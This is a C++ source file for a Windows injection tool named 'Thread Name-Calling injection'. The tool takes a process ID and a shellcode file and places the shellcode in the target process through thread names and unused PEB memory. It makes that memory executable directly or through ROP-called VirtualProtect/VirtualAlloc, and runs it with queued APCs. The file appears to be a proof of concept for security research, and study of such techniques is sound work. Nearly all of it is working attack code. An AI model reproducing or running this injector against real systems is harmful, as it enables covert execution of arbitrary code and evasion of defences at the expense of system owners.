#include <windows.h>

#include "../common.h"
#include "../ntdll_wrappers.h"
#include "shellcode.h"

#include <processthreadsapi.h>
#include <TlHelp32.h>

#include <iostream>
#include <sstream>
#include <vector>

#ifdef USE_ROP
#include "rop_api.h"
#endif

int loadInt(const std::string& str, bool as_hex)
{
	int intVal = 0;

	std::stringstream ss;
	ss << (as_hex ? std::hex : std::dec) << str;
	ss >> intVal;

	return intVal;
}

BYTE* load_from_file(const char* filename, size_t& data_size)
{
	FILE* fp = fopen(filename, "rb");
	if (!fp) return nullptr;

	fseek(fp, 0, SEEK_END);
	size_t fsize = ftell(fp);
	BYTE* data = (BYTE*)::calloc(fsize, 1);
	if (!data) return nullptr;

	fseek(fp, 0, SEEK_SET);
	data_size = fsize;
	fread(data, 1, data_size, fp);
	fclose(fp);
	return data;
}

//----

bool make_executable(HANDLE hProcess, HANDLE hThread, void* shellcodePtr, size_t payload_len, void* stackPtr = NULL)
{
	bool isExecutable = false;
#ifdef USE_ROP
	if (!stackPtr || !EBFE_VA) {
		std::cerr << "Not initialized!\n";
		return false;
	}
	const DWORD sleep_time = WAIT_UNIT * 2;
	if (!set_thread_sleep(hThread, sleep_time)) {
		std::cout << "Could not switch the thread into a sleeping mode!\n";
		return false;
	}
	std::cout << "Thread switched into a sleep mode!\n";
	CONTEXT storedContext = { 0 };
	PDWORD oldProtect = (PDWORD)((ULONG_PTR)stackPtr + 8);
	isExecutable = remote_VirtualProtect(hThread, (LPVOID)stackPtr, &storedContext, (LPVOID)shellcodePtr, payload_len, PAGE_EXECUTE_READWRITE, oldProtect);
	if (isExecutable) {
		std::cout << "Remote VirtualProtect succeeded!\n";
	}
	if (set_context(hThread, storedContext)) {
		std::cout << "Reverted to the initial context!\n";
	}
#else
	DWORD oldProtect = 0;
	if (!VirtualProtectEx(hProcess, shellcodePtr, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		std::cout << "Failed to protect!" << std::hex << GetLastError() << "\n";
		return false;
	}
	isExecutable = true;
	std::cout << "Protection changed! Old: " << std::hex << oldProtect << "\n";
#endif
	return isExecutable;
}


LPVOID move_to_new_executable(HANDLE hProcess, HANDLE hThread, void* remotePtr, size_t payload_len, void* stackPtr = NULL)
{
	LPVOID shellcodePtr = nullptr;
#ifdef USE_ROP
	if (!stackPtr || !EBFE_VA) {
		std::cerr << "Not initialized!\n";
		return false;
	}
	const DWORD sleep_time = WAIT_UNIT * 2;
	if (!set_thread_sleep(hThread, sleep_time)) {
		std::cout << "Could not switch the thread into a sleeping mode!\n";
		return false;
	}
	std::cout << "Thread switched into a sleep mode!\n";
	CONTEXT storedContext = { 0 };
	LPVOID allocatedPtr = remote_VirtualAlloc(hThread, (LPVOID)stackPtr, &storedContext, 0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (allocatedPtr) {
		std::cout << "Remote VirtualAlloc succeeded!\n";
		shellcodePtr = allocatedPtr;
	}
	if (set_context(hThread, storedContext)) {
		std::cout << "Reverted to the initial context!\n";
	}
#else
	shellcodePtr = VirtualAllocEx(hProcess, nullptr, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
#endif
	if (!shellcodePtr) {
		std::cout << "Failed to allocate!" << std::hex << GetLastError() << "\n";
		return nullptr;
	}
	std::cout << "Allocated: " << std::hex << shellcodePtr << "\n";
	void* _RtlMoveMemoryPtr = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlMoveMemory");
	if (!_RtlMoveMemoryPtr) {
		std::cerr << "Failed retrieving: _RtlMoveMemoryPtr\n";
		return nullptr;
	}
	if (!queue_apc_thread(hThread, _RtlMoveMemoryPtr, shellcodePtr, remotePtr, (void*)payload_len)) {
		return nullptr;
	}
	std::cout << "Added RtlMoveMemory to the thread queue!\n";
	return shellcodePtr;

}

#define USE_PROXY_FUNC
bool run_injected(HANDLE hProcess, void* remotePtr, size_t payload_len, void *stackPtr=NULL)
{
	void* shellcodePtr = nullptr;

	DWORD access = SYNCHRONIZE;
	access |= THREAD_SET_CONTEXT; // required for the APC queue;
#ifdef USE_ROP
	access |= THREAD_GET_CONTEXT;
	access |= THREAD_SUSPEND_RESUME;
#endif

#ifdef USE_NEW_THREADS
	HANDLE hThread = create_alertable_thread(hProcess);
#else
	HANDLE hThread = find_thread(hProcess, access);
#endif
	if (!hThread || hThread == INVALID_HANDLE_VALUE) {
		std::cerr << "Invalid thread handle!\n";
		return false;
	}
	BOOL isExecutable = FALSE;

#ifdef USE_NEW_BUFFER
	shellcodePtr = move_to_new_executable(hProcess, hThread, remotePtr, payload_len, stackPtr);
#else
	if (make_executable(hProcess, hThread, remotePtr, payload_len, stackPtr)) {
		shellcodePtr = remotePtr;
	}
#endif
	if (!shellcodePtr) {
		std::cout << "Making memory executable failed!\n";
		return false;
	}
	
	bool isOk = false;
#ifdef USE_PROXY_FUNC
	auto _RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
	if (_RtlDispatchAPC) {
		std::cout << "Using RtlDispatchAPC\n";
		if (queue_apc_thread(hThread, _RtlDispatchAPC, shellcodePtr, 0, (void*)(-1))) {
			isOk = true;
		}
	}
	else
#endif
		if (queue_apc_thread(hThread, shellcodePtr, 0, 0, 0)) {
			isOk = true;
		}

	if (isOk) std::cout << "Added to the thread queue!\n";
#ifdef USE_NEW_THREADS
	ResumeThread(hThread);
#endif
	CloseHandle(hThread);
	return isOk;
}

bool write_name_and_call(HANDLE hProcess, BYTE* payload, const size_t payload_size, void* remotePtr)
{
	void* remoteStackPtr = nullptr;
	void* shcPtr = nullptr;

	BYTE* thread_name = nullptr;
	size_t thread_name_size = 0;

#ifdef USE_ROP
	if (!init_gadgets() || !EBFE_VA) {
		std::cerr << "Failed to initialize the gadget\n";
		return false;
	}
	const size_t stackPadding = 0x100;
	size_t stack_size = stackPadding * 2;

	//prepare a combined buffer: data + stack
	BYTE* data = (BYTE*)::calloc(payload_size + stack_size, 1);
	if (!data) return false;

	::memcpy(data, payload, payload_size);

	ULONG_PTR paddedStack = (ULONG_PTR)data + payload_size + stackPadding;
	ULONG_PTR *paddedStackPtr = (ULONG_PTR*)paddedStack;
	(*paddedStackPtr) = EBFE_VA; // write an address of the gadget on the stack
	thread_name = data;
	thread_name_size = (payload_size + stack_size);
#else
	thread_name = payload;
	thread_name_size = payload_size;
#endif

	shcPtr = pass_via_thread_name(hProcess, thread_name, thread_name_size, remotePtr);

#ifdef USE_ROP
	free(data); data = nullptr;
	if (shcPtr) {
		remoteStackPtr = (void*)((ULONG_PTR)shcPtr + payload_size + stackPadding);
		std::cout << "Received Stack pointer:  " << std::hex << remoteStackPtr << "\n";

		// double-check if the passed data is correct:
		ULONG_PTR test_buf = 0;
		if (!read_remote(hProcess, remoteStackPtr, &test_buf, sizeof(test_buf))) {
			std::cerr << "Failed to read back the stack!\n";
			return false;
		}
		if (test_buf != EBFE_VA) {
			std::cout << "Invalid remote stack: " << std::hex << test_buf << "\n";
			return false;
		}
	}
#endif

	std::cout << "Received pointer:  " << std::hex << shcPtr << "\n";
	if (!shcPtr) {
		return false;
	}
	return run_injected(hProcess, shcPtr, payload_size, remoteStackPtr);
}

bool thread_namecaller(DWORD processID, BYTE* payload, const size_t payload_size)
{
	HANDLE hProcess = open_process(processID);
	if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
		std::cerr << "Opening process failed!\n";
		return false;
	}
	void* remotePtr = get_peb_unused(hProcess);
	if (!remotePtr) return false;

	return write_name_and_call(hProcess, payload, payload_size, remotePtr);
}

//---

int main(int argc, char *argv[])
{
	std::cout << "Thread Name-Calling injection\n";
	BYTE* payload = (BYTE*)g_payload;
	size_t payload_len = g_payload_len;

	DWORD processID = 0;
	if (argc < 2) {
		std::cout << "Arg <PID> [shellcode file";
#ifdef USE_DEFAULT_SET_THREAD_DESC
		std::cout << "*";
#endif
		std::cout << "]\n";
#ifdef USE_DEFAULT_SET_THREAD_DESC
		std::cout << "* - requires encoded shellcode without double NULL bytes\n";
#endif
		return 0;
	}
#ifdef USE_ROP
	#ifdef USE_DEFAULT_SET_THREAD_DESC
	#error "Error: Using ROP requires passing buffer with NULL bytes. This cannot be done using default SetThreadDescription!"
	#endif // USE_DEFAULT_SET_THREAD_DESC

	#ifdef USE_NEW_THREADS
	#error "ROP for newly created suspended threads not implemented"
	#endif // USE_NEW_THREADS
#endif //USE_ROP

	if (argc > 2) {
		char* filename = argv[2];
		payload = load_from_file(filename, payload_len);
		if (!payload) {
			std::cerr << "Failed loading shellcode from file: " << filename << std::endl;
			return -1;
		}
	}
#ifdef USE_NEW_THREADS
	std::cout << "[*] Injecting into NEW threads\n";
#else
	std::cout << "[*] Inject into existing threads\n";
#endif
#ifdef USE_OLD_APC_API
	std::cout << "[*] Using old API for APC\n";
#else
	std::cout << "[*] Using new API for APC\n";
#endif
#ifdef USE_NEW_BUFFER
	std::cout << "[*] The shellcode will be copied into a new buffer\n";
#else
	std::cout << "[*] The shellcode will be run from the heap\n";
#endif
#ifdef USE_ROP
	std::cout << "[*] Using VirtualProtect/VirtualAlloc called via ROP\n";
#else
	std::cout << "[*] Using VirtualProtectEx/VirtualAllocEx\n";
#endif
	processID = loadInt(argv[1], false);
	std::cout << "Supplied PID: " << processID << "\n";

	if (!processID) {
		std::cerr << "Invalid process ID supplied...\n";
		return -1;
	}
	if (!thread_namecaller(processID, payload, payload_len)) {
		return -2;
	}
	std::cout << "[+] Done\n";
	return 0;
}
